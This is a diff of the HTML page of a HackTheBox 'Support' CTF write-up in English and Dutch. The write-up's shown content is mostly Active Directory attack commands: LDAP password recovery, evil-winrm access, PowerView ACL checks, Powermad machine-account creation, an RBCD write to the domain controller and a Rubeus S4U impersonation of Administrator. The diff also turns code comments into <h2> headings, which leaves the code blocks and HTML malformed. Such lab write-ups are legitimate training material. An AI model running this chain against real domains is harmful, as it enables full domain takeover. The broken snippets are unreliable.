@@ -4,16 +4,16 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Support — HackTheBox CTF Writeup | CyberStefan</title>
-  <meta name="description" content="HackTheBox Support (Easy): null-session SMB naar een .NET-binary met hardcoded LDAP-creds, wachtwoord uit het AD info-veld, en GenericAll over de DC via RBCD naar Administrator.">
+  <meta name="description" content="HackTheBox — Support (Easy) Support is an AD box. The chain is long but every link is small: an anonymous SMB share, a .NET binary with a hardcoded LDAP…">
   <meta property="og:type" content="article">
   <meta property="og:site_name" content="CyberStefan">
   <meta property="og:title" content="Support CTF Writeup — CyberStefan">
-  <meta property="og:description" content="HackTheBox Support (Easy): null-session SMB naar een .NET-binary met hardcoded LDAP-creds, wachtwoord uit het AD info-veld, en GenericAll over de DC via RBCD naar Administrator.">
+  <meta property="og:description" content="HackTheBox — Support (Easy) Support is an AD box. The chain is long but every link is small: an anonymous SMB share, a .NET binary with a hardcoded LDAP…">
   <meta property="og:url" content="https://cyberstefan.nl/writeup/support/">
   <meta property="og:image" content="https://cyberstefan.nl/assets/cyberstefan-icon.png">
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:title" content="Support CTF Writeup — CyberStefan">
-  <meta name="twitter:description" content="HackTheBox Support (Easy): null-session SMB naar een .NET-binary met hardcoded LDAP-creds, wachtwoord uit het AD info-veld, en GenericAll over de DC via RBCD naar Administrator.">
+  <meta name="twitter:description" content="HackTheBox — Support (Easy) Support is an AD box. The chain is long but every link is small: an anonymous SMB share, a .NET binary with a hardcoded LDAP…">
   <meta name="twitter:image" content="https://cyberstefan.nl/assets/cyberstefan-icon.png">
   <link rel="canonical" href="https://cyberstefan.nl/writeup/support/">
   <link rel="icon" type="image/x-icon" href="/favicon.ico">
@@ -21,7 +21,7 @@
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="/assets/style.css?v=2">
-  <script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Support — HackTheBox CTF Writeup", "description": "HackTheBox Support (Easy): null-session SMB naar een .NET-binary met hardcoded LDAP-creds, wachtwoord uit het AD info-veld, en GenericAll over de DC via RBCD naar Administrator.", "author": {"@type": "Person", "name": "CyberStefan", "url": "https://cyberstefan.nl"}, "publisher": {"@type": "Organization", "name": "CyberStefan", "url": "https://cyberstefan.nl"}, "datePublished": "2026-04-30", "dateModified": "2026-04-30", "keywords": "AD, LDAP, RBCD, Kerberos, Windows, Privesc, .NET, SMB, HackTheBox, Easy, CTF, writeup, ethical hacking", "articleSection": "CTF Writeup", "url": "https://cyberstefan.nl/writeup/support/", "inLanguage": ["en", "nl"], "image": "https://cyberstefan.nl/assets/cyberstefan-icon.png"}</script>
+  <script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Support — HackTheBox CTF Writeup", "description": "HackTheBox — Support (Easy) Support is an AD box. The chain is long but every link is small: an anonymous SMB share, a .NET binary with a hardcoded LDAP…", "author": {"@type": "Person", "name": "CyberStefan", "url": "https://cyberstefan.nl"}, "publisher": {"@type": "Organization", "name": "CyberStefan", "url": "https://cyberstefan.nl"}, "datePublished": "2026-04-30", "dateModified": "2026-04-30", "keywords": "AD, LDAP, RBCD, Kerberos, Windows, Privesc, .NET, SMB, HackTheBox, Easy, CTF, writeup, ethical hacking", "articleSection": "CTF Writeup", "url": "https://cyberstefan.nl/writeup/support/", "inLanguage": ["en", "nl"], "image": "https://cyberstefan.nl/assets/cyberstefan-icon.png"}</script>
   <script type="application/ld+json">{"@context": "https://schema.org", "@type": "BreadcrumbList", "itemListElement": [{"@type": "ListItem", "position": 1, "name": "Home", "item": "https://cyberstefan.nl/"}, {"@type": "ListItem", "position": 2, "name": "Support Writeup", "item": "https://cyberstefan.nl/writeup/support/"}]}</script>
 </head>
 <body>
@@ -92,7 +92,7 @@ smb: \&gt; get UserInfo.exe.zip</code></pre>
 <p><code>UserInfo.exe</code> is a .NET binary, so it decompiles cleanly — people forget compiled .NET is basically source. In ILSpy the <code>Protected</code> class had an encrypted password with the key sitting right next to it:</p>
 <pre><code>byte[] key = Encoding.ASCII.GetBytes(&quot;armando&quot;);
 // array[i] = (array[i] ^ key[i % key.Length]) ^ 0xDF</code></pre>
-<p>Reimplemented the same XOR in Python to recover the <code>ldap</code> user&#x27;s password (kept as <code>&lt;LDAP_PASSWORD&gt;</code> here). One thing that genuinely cost me time: the password has a <code>$</code> in it and I&#x27;d pasted it between double quotes in bash — bash ate it as a variable and the LDAP bind kept failing with a half-empty password. Single quotes fixed it.</p>
+<p>Reimplemented the same XOR in Python to recover the <code>ldap</code> user&#x27;s password (kept as <code>&lt;LDAP_PASSWORD&gt;</code> here). One thing that genuinely cost me time: the password has a <code>$</code> in it and I had pasted it between double quotes in bash — bash ate it as a variable and the LDAP bind kept failing with a half-empty password. Single quotes fixed it.</p>
 <pre><code>ldapsearch -x -H ldap://10.129.43.78 -D &quot;ldap@support.htb&quot; -w &#x27;&lt;LDAP_PASSWORD&gt;&#x27; -b &quot;DC=support,DC=htb&quot; &quot;(sAMAccountName=support)&quot;</code></pre>
 <p>The <code>support</code> account had its password sitting in the <code>info</code> attribute — readable by any authenticated LDAP user. With that, straight in over WinRM:</p>
 <pre><code>evil-winrm -i 10.129.43.78 -u support -p &#x27;&lt;SUPPORT_PASSWORD&gt;&#x27;</code></pre>
@@ -100,10 +100,10 @@ smb: \&gt; get UserInfo.exe.zip</code></pre>
 <h2>Privesc</h2>
 <p><code>whoami /all</code> as support showed two things that only matter together: membership of <code>Shared Support Accounts</code>, and <code>SeMachineAccountPrivilege</code> (I can add machine accounts to the domain). Loaded PowerView and checked the DC&#x27;s ACL:</p>
 <pre><code>Get-DomainObjectAcl -Identity &quot;DC$&quot; -ResolveGUIDs | ? {$_.SecurityIdentifier -match &quot;1103&quot;}
-# ActiveDirectoryRights : GenericAll</code></pre>
+<h2>ActiveDirectoryRights : GenericAll</code></pre></h2>
 <p>So my group has <code>GenericAll</code> over the Domain Controller object. Combined with being allowed to create machine accounts, that is textbook RBCD: create a computer account with Powermad, then point the DC&#x27;s <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> at its SID.</p>
 <pre><code>New-MachineAccount -MachineAccount FakeComputer -Password $(ConvertTo-SecureString &#x27;Password123!&#x27; -AsPlainText -Force)
-# grab FakeComputer SID, build the SD, then:
+<h2>grab FakeComputer SID, build the SD, then:</h2>
 Get-DomainComputer DC | Set-DomainObject -Set @{&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes}</code></pre>
 <p>Then S4U with Rubeus to impersonate Administrator (Rubeus wants the RC4/NTLM of the FakeComputer password, not the password itself):</p>
 <pre><code>.\Rubeus.exe s4u /user:FakeComputer$ /rc4:&lt;FAKECOMPUTER_NTLM_HASH&gt; /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /nowrap</code></pre>
@@ -138,10 +138,10 @@ smb: \&gt; get UserInfo.exe.zip</code></pre>
 <h2>Privesc</h2>
 <p><code>whoami /all</code> als support toonde twee dingen die alleen samen iets betekenen: lidmaatschap van <code>Shared Support Accounts</code>, en <code>SeMachineAccountPrivilege</code> (ik mag machine accounts aan het domein toevoegen). PowerView geladen en de ACL van de DC bekeken:</p>
 <pre><code>Get-DomainObjectAcl -Identity &quot;DC$&quot; -ResolveGUIDs | ? {$_.SecurityIdentifier -match &quot;1103&quot;}
-# ActiveDirectoryRights : GenericAll</code></pre>
+<h2>ActiveDirectoryRights : GenericAll</code></pre></h2>
 <p>Mijn groep heeft dus <code>GenericAll</code> over het Domain Controller-object. Samen met machine accounts mogen aanmaken is dat RBCD uit het boekje: een computer-account maken met Powermad, dan de <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> van de DC op die SID zetten.</p>
 <pre><code>New-MachineAccount -MachineAccount FakeComputer -Password $(ConvertTo-SecureString &#x27;Password123!&#x27; -AsPlainText -Force)
-# FakeComputer-SID pakken, de SD bouwen, dan:
+<h2>FakeComputer-SID pakken, de SD bouwen, dan:</h2>
 Get-DomainComputer DC | Set-DomainObject -Set @{&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes}</code></pre>
 <p>Daarna S4U met Rubeus om Administrator te impersonaten (Rubeus wil de RC4/NTLM van het FakeComputer-wachtwoord, niet het wachtwoord zelf):</p>
 <pre><code>.\Rubeus.exe s4u /user:FakeComputer$ /rc4:&lt;FAKECOMPUTER_NTLM_HASH&gt; /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /nowrap</code></pre>
